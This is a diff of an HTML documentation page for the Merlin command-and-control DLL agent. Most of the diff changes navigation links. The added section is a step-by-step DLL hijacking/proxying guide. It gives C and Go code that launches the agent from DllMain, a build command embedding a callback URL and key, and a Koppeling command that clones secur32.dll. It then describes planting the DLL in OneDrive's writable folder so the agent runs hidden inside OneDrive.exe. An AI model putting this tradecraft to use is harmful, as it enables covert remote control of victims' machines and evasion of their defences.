@@ -45,11 +45,13 @@
   </form>
 </div>
         </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
-              <p class="caption" role="heading"><span class="caption-text">Quick Start</span></p>
+              <p class="caption" role="heading"><span class="caption-text">FAQ</span></p>
 <ul>
-<li class="toctree-l1"><a class="reference internal" href="../quickStart/server.html">Merlin Server</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../quickStart/agent.html">Merlin Agent</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../quickStart/faq.html">FAQ</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../faq/faq.html">FAQ</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Quick Start</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../quickStart/quickstart.html">Quick Start</a></li>
 </ul>
 <p class="caption" role="heading"><span class="caption-text">Merlin Agent</span></p>
 <ul class="current">
@@ -58,21 +60,28 @@
 <li class="toctree-l2"><a class="reference internal" href="#creating-the-dll">Creating the DLL</a></li>
 <li class="toctree-l2"><a class="reference internal" href="#dll-entry-points">DLL Entry Points</a></li>
 <li class="toctree-l2"><a class="reference internal" href="#execution-with-rundll32-exe">Execution with rundll32.exe</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#dll-hijacking-proxying-with-the-merlin-dll-agent">DLL Hijacking/Proxying with the Merlin DLL Agent</a></li>
 </ul>
 </li>
 <li class="toctree-l1"><a class="reference internal" href="custom.html">Custom Build</a></li>
 </ul>
 <p class="caption" role="heading"><span class="caption-text">Merlin CLI</span></p>
 <ul>
-<li class="toctree-l1"><a class="reference internal" href="../cli/cli.html">HOME</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../cli/faq.html">FAQ</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../cli/cli.html">Command Line Flags</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../cli/tls.html">TLS</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../cli/listeners.html">Listeners</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../cli/commands.html">Command Interface</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../cli/logging.html">Logging</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../cli/menu/main.html">Main Menu</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../cli/menu/agents.html">Agent Menu</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../cli/menu/listeners.html">Listener Menu</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../cli/menu/modules.html">Modules Menu</a></li>
 </ul>
 <p class="caption" role="heading"><span class="caption-text">Merlin Server</span></p>
 <ul>
-<li class="toctree-l1"><a class="reference internal" href="../server/server.html">Introduction</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../server/menu/main.html">Main Menu</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../server/menu/agents.html">Agent Menu</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../server/menu/listeners.html">Listener Menu</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../server/menu/modules.html">Modules Menu</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../server/server.html">Command Line Flags</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../server/logging.html">Logging</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../server/x509.html">TLS Certificates</a></li>
 </ul>
 <p class="caption" role="heading"><span class="caption-text">Modules</span></p>
@@ -83,7 +92,6 @@
 <ul>
 <li class="toctree-l1"><a class="reference internal" href="../misc/blogs.html">Blog Posts</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../misc/contrib.html">Contributing</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../misc/logging.html">Logging</a></li>
 </ul>
 
         </div>
@@ -196,6 +204,69 @@ Using <code class="docutils literal notranslate"><span class="pre">VoidFunc</spa
 <p>A different Merlin server <em>can</em> be provided when executing the DLL by supplying the target URL as an argument. An example is:</p>
 <p><code class="docutils literal notranslate"><span class="pre">rundll32</span> <span class="pre">merlin.dll,Run</span> <span class="pre">https://yourdomian.com:443/</span></code></p>
 <p><strong>NOTE:</strong> Passing a custom URL only works when using cmd.exe and fails when using powershell.exe</p>
+</section>
+<section id="dll-hijacking-proxying-with-the-merlin-dll-agent">
+<h2>DLL Hijacking/Proxying with the Merlin DLL Agent<a class="headerlink" href="#dll-hijacking-proxying-with-the-merlin-dll-agent" title="Link to this heading"></a></h2>
+<p>With a little bit of setup, the Merlin DLL agent can be used for DLL Hijacking / Side-loading / Proxying. This is a great technique to get the Merlin agent running in the codespace of a trusted process.</p>
+<p>The specifics on choosing an executable for DLL proxying are outside the scope of this documentation. Assume that a candidate executable has been identified.</p>
+<p>In the <code class="docutils literal notranslate"><span class="pre">merlin-agent-dll</span></code> repo, add a new exported function with an arbitrary name to <code class="docutils literal notranslate"><span class="pre">main.go</span></code>. Have this function execute the <code class="docutils literal notranslate"><span class="pre">run</span></code> function with the <code class="docutils literal notranslate"><span class="pre">url</span></code> argument:</p>
+<div class="highlight-go notranslate"><div class="highlight"><pre><span></span><span class="o">...</span><span class="p">[</span><span class="nx">SNIP</span><span class="p">]</span><span class="o">...</span>
+
+<span class="c1">// EXPORTED FUNCTIONS</span>
+
+<span class="c1">// MagicMan is a test function</span>
+<span class="c1">//</span>
+<span class="c1">//export MagicMan</span>
+<span class="kd">func</span><span class="w"> </span><span class="nx">MagicMan</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">run</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span>
+<span class="p">}</span>
+
+<span class="o">...</span><span class="p">[</span><span class="nx">SNIP</span><span class="p">]</span><span class="o">...</span>
+</pre></div>
+</div>
+<p>Note that the name of the exported function must match in the comment block and the code itself or Go will complain during compilation.</p>
+<p>Now, in the <code class="docutils literal notranslate"><span class="pre">merlin.c</span></code> source code, add a new function that executes the exported function from <code class="docutils literal notranslate"><span class="pre">main.go</span></code>:</p>
+<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="p">...[</span><span class="n">SNIP</span><span class="p">]...</span>
+
+<span class="n">DWORD</span><span class="w"> </span><span class="n">WINAPI</span><span class="w"> </span><span class="n">RunMagicMan</span><span class="p">(</span><span class="n">LPVOID</span><span class="w"> </span><span class="n">LpParam</span><span class="p">){</span>
+<span class="w">    </span><span class="c1">//MessageBoxA( NULL, &quot;Hello from MagicMan() in Merlin&quot;, &quot;DLL Load&quot;, MB_OK );</span>
+<span class="w">    </span><span class="n">MagicMan</span><span class="p">();</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">TRUE</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="p">...[</span><span class="n">SNIP</span><span class="p">]...</span>
+</pre></div>
+</div>
+<p>Next, edit the structure of <code class="docutils literal notranslate"><span class="pre">DllMain</span></code> entry point. We want to create a thread that will execute the Merlin agent function when the DLL is side-loaded into the process:</p>
+<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="p">...[</span><span class="n">SNIP</span><span class="p">]...</span>
+
+<span class="n">BOOL</span><span class="w"> </span><span class="n">WINAPI</span><span class="w"> </span><span class="n">DllMain</span><span class="p">(</span>
+<span class="w">    </span><span class="n">HINSTANCE</span><span class="w"> </span><span class="n">hinstDLL</span><span class="p">,</span><span class="w">  </span><span class="c1">// handle to DLL module</span>
+<span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">fdwReason</span><span class="p">,</span><span class="w">     </span><span class="c1">// reason for calling function</span>
+<span class="w">    </span><span class="n">LPVOID</span><span class="w"> </span><span class="n">lpReserved</span><span class="w"> </span><span class="p">)</span><span class="w">  </span><span class="c1">// reserved</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="c1">// Perform actions based on the reason for calling.</span>
+<span class="w">    </span><span class="k">switch</span><span class="p">(</span><span class="w"> </span><span class="n">fdwReason</span><span class="w"> </span><span class="p">)</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="no">DLL_PROCESS_ATTACH</span><span class="p">:</span>
+<span class="w">            </span><span class="c1">//MessageBoxA( NULL, &quot;Hello from DllMain-PROCESS_ATTACH in Merlin!&quot;, &quot;DLL Load&quot;, MB_OK );</span>
+<span class="w">            </span><span class="n">CreateThread</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">RunMagicMan</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
+<span class="w">            </span><span class="k">break</span><span class="p">;</span>
+
+<span class="p">...[</span><span class="n">SNIP</span><span class="p">]...</span>
+</pre></div>
+</div>
+<p>Now, when the Merlin DLL Agent is loaded by a trusted process, the DLL entry point will run the CreateThread function and execute the agent.</p>
+<p>Build the DLL agent with the merlin-agent-dll makefile and supply your desired URL, PSK, and protocol parameters:</p>
+<p><code class="docutils literal notranslate"><span class="pre">husky&#64;dev-kde:~/merlin-agent-dll$</span> <span class="pre">make</span> <span class="pre">URL=http://10.10.1.237:8443</span> <span class="pre">PSK=merlin</span> <span class="pre">PROTO=http</span></code></p>
+<p>Let’s assume that we’re targeting the OneDrive.exe program for our DLL Proxy. We know that OneDrive.exe loads <code class="docutils literal notranslate"><span class="pre">secur32.dll</span></code> from the present working directory during execution.</p>
+<p>We can now use a tool like Koppelling to create a proxied DLL:</p>
+<p><code class="docutils literal notranslate"><span class="pre">PS</span> <span class="pre">C:\Users\Matt\Desktop\Koppeling&gt;</span> <span class="pre">.\NetClone.exe</span> <span class="pre">--target</span> <span class="pre">'C:\Users\Matt\Desktop\merlin.dll'</span> <span class="pre">--reference</span> <span class="pre">'C:\Windows\system32\secur32.dll'</span> <span class="pre">--output</span> <span class="pre">'C:\Users\Matt\Desktop\secur32.dll'</span></code></p>
+<p>Then, we endeavor to drop our proxied DLL into the OneDrive application directory. Luckily for us, this is in %APPDATA% and we can write to the directory:</p>
+<p><code class="docutils literal notranslate"><span class="pre">C:\Users\Matt\AppData\Local\Microsoft\OneDrive</span></code></p>
+<p>When the application starts, our proxied DLL is pulled into the process and a thread is executed. Our session is established and our agent lives inside the OneDrive.exe process:</p>
+<img alt="DLL Proxy 1" class="align-center" src="../_images/dll-proxy-1.png" />
+<img alt="DLL Proxy 2" class="align-center" src="../_images/dll-proxy-2.png" />
 </section>
 </section>
 
